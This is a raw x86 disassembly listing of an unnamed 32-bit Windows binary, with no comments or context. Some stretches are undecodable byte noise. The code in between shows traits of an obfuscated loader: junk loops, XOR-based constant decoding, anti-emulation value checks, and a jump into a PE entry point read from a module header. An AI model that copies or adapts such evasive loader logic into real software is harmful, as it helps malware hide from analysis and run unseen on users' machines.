  40d71b:	iret   
  40d71c:	xor    dl,BYTE PTR [eax]
  40d71e:	test   eax,0x2ad52ae6
  40d723:	sbb    ch,BYTE PTR [eax-0x3cef163d]
  40d729:	in     eax,dx
  40d72a:	and    eax,0xd4411aaa
  40d72f:	adc    DWORD PTR [edi-0x20],0xd0dec77f
  40d736:	mov    ecx,0xa5eec1f7
  40d73b:	mov    eax,ds:0x837bb56b
  40d740:	add    esp,DWORD PTR [edx+edx*2-0x5]
  40d744:	mov    ecx,?
  40d746:	jge    0x40d795
  40d748:	mov    ah,BYTE PTR [edi]
  40d74a:	cmp    dh,al
  40d74c:	push   esi
  40d74d:	not    BYTE PTR [ecx]
  40d74f:	cmp    bh,BYTE PTR [esi-0x36ccfdba]
  40d755:	outs   dx,DWORD PTR ds:[esi]
  40d756:	dec    ebx
  40d757:	aas    
  40d758:	lds    esi,FWORD PTR [edx+0x42]
  40d75b:	mov    eax,0x68467d2b
  40d760:	test   BYTE PTR [edi],0xb8
  40d763:	data16 clc 
  40d765:	xchg   ebx,eax
  40d766:	sub    DWORD PTR ds:0x9be3c4bf,esi
  40d76c:	xor    ch,BYTE PTR [ebx+0x2c]
  40d76f:	xor    DWORD PTR [esi-0x2c],0xffffffac
  40d773:	sbb    eax,0xd48e5abd
  40d778:	mov    eax,ds:0xefab9286
  40d77d:	and    eax,0xc5c6072b
  40d782:	add    eax,0xfef357cd
  40d787:	sbb    BYTE PTR [edx],0x89
  40d78a:	(bad)  
  40d78b:	cmp    DWORD PTR [edi+0x525f5ac1],ebx
  40d791:	arpl   WORD PTR [edx+0x69],sp
  40d794:	cmp    al,0xae
  40d796:	adc    BYTE PTR [edi-0x4bd52d0],cl
  40d79c:	sar    BYTE PTR [eax-0x10472985],cl
  40d7a2:	cld    
  40d7a3:	lock xor ecx,ebx
  40d7a6:	ret    
  40d7a7:	or     dh,BYTE PTR [esi]
  40d7a9:	out    0x9,eax
  40d7ab:	(bad)  
  40d7ac:	sbb    esp,ecx
  40d7ae:	mov    dl,0xe3
  40d7b0:	out    dx,eax
  40d7b1:	jecxz  0x40d76b
  40d7b3:	nop
  40d7b4:	popf   
  40d7b5:	pop    esi
  40d7b6:	lock ss xor bh,0x47
  40d7bb:	jbe    0x40d83c
  40d7bd:	sahf   
  40d7be:	dec    edx
  40d7bf:	test   eax,0x22277ce5
  40d7c4:	xchg   esp,eax
  40d7c5:	xor    eax,0xd806f413
  40d7ca:	add    al,0x89
  40d7cc:	out    0xa2,al
  40d7ce:	aas    
  40d7cf:	pop    es
  40d7d0:	cmp    esi,esi
  40d7d2:	scas   al,BYTE PTR es:[edi]
  40d7d3:	pop    es
  40d7d4:	push   0xa3a792bc
  40d7d9:	bnd jnp 0x40d79b
  40d7dc:	cmp    cl,dh
  40d7de:	rcl    DWORD PTR [ebx],1
  40d7e0:	imul   bp
  40d7e3:	popa   
  40d7e4:	or     bl,BYTE PTR [edi-0x773162d2]
  40d7ea:	pop    ecx
  40d7eb:	mov    ecx,0x605af919
  40d7f0:	enter  0xfa62,0x2e
  40d7f4:	push   0xffffff85
  40d7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7f7:	xor    DWORD PTR [ebx],edi
  40d7f9:	dec    ecx
  40d7fa:	daa    
  40d7fb:	or     eax,0xf7e36992
  40d800:	pop    ebx
  40d802:	add    DWORD PTR [edx+0x5af9b0be],ebx
  40d808:	or     edi,eax
  40d80a:	xchg   edi,eax
  40d80b:	inc    esp
  40d80c:	cmp    DWORD PTR [ebp+0x6cb41cb2],ebp
  40d812:	jp     0x40d7ef
  40d814:	inc    ebp
  40d815:	fiadd  DWORD PTR [ecx+eax*1+0x4f6b6c23]
  40d81c:	or     DWORD PTR [ebx],ecx
  40d81e:	adc    dl,cl
  40d820:	mov    WORD PTR [eax+0x58],?
  40d823:	fxch   st(1)
  40d825:	push   0x7b35ee35
  40d82a:	push   ebp
  40d82b:	enter  0x32f3,0x80
  40d82f:	or     ebx,DWORD PTR [esi-0x35]
  40d832:	jp     0x40d82d
  40d834:	jmp    0xb168:0xce6cf408
  40d83b:	ja     0x40d7ce
  40d83d:	adc    DWORD PTR [eax],esi
  40d83f:	cwde   
  40d840:	outs   dx,BYTE PTR ds:[esi]
  40d841:	adc    ch,bh
  40d843:	cmp    DWORD PTR [esi+0x47],edx
  40d846:	add    eax,DWORD PTR [edi+0x4b0a4eac]
  40d84c:	je     0x40d8b3
  40d84e:	int    0xa1
  40d850:	sti    
  40d851:	sbb    al,0x44
  40d853:	push   ss
  40d854:	fbstp  TBYTE PTR [esi+0x5]
  40d857:	pushf  
  40d858:	lods   al,BYTE PTR ds:[esi]
  40d859:	es cli 
  40d85b:	fs sub eax,0xa8d4de89
  40d861:	mov    DWORD PTR [ebx-0x4f],esp
  40d864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d865:	rcr    BYTE PTR [edx-0x22975ffa],1
  40d86b:	or     al,0xb
  40d86d:	ss push edx
  40d86f:	(bad)  
  40d870:	call   0xf0bddbce
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x7f5f2fbc]
  40e122:	daa    
  40e123:	pushf  
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e1ab
  40e12d:	mov    esi,0x57fe16ad
  40e132:	inc    edx
  40e133:	and    eax,0x391bc2bc
  40e138:	sbb    al,0x24
  40e13a:	stos   BYTE PTR es:[edi],al
  40e13b:	shr    BYTE PTR [ecx],cl
  40e13d:	and    eax,0xba8da0a9
  40e142:	adc    al,BYTE PTR [eax]
  40e144:	push   edi
  40e145:	jg     0x40e164
  40e147:	adc    DWORD PTR [edi-0x5e675a6c],edx
  40e14d:	loope  0x40e0f1
  40e14f:	(bad)  
  40e150:	call   FWORD PTR [edx+0x14]
  40e153:	push   esi
  40e154:	es pop ss
  40e156:	int3   
  40e157:	jb     0x40e192
  40e159:	cmp    BYTE PTR [esi],0x69
  40e15c:	mov    ah,0x30
  40e15e:	mov    dl,0x10
  40e160:	dec    ebx
  40e161:	js     0x40e19c
  40e163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e164:	inc    edx
  40e165:	push   esp
  40e166:	fnstenv ds:0xe601d1d0
  40e16c:	inc    ecx
  40e16d:	push   esp
  40e16e:	sbb    al,0xd6
  40e170:	and    DWORD PTR ds:0xf102dae7,esi
  40e176:	neg    ecx
  40e178:	cdq    
  40e179:	nop
  40e17a:	retf   0x6b78
  40e17d:	pushf  
  40e17e:	pop    esi
  40e17f:	(bad)  
  40e180:	iret   
  40e181:	es xchg edi,eax
  40e183:	iret   
  40e184:	and    ch,BYTE PTR [ebx+0x3e9f643a]
  40e18a:	sti    
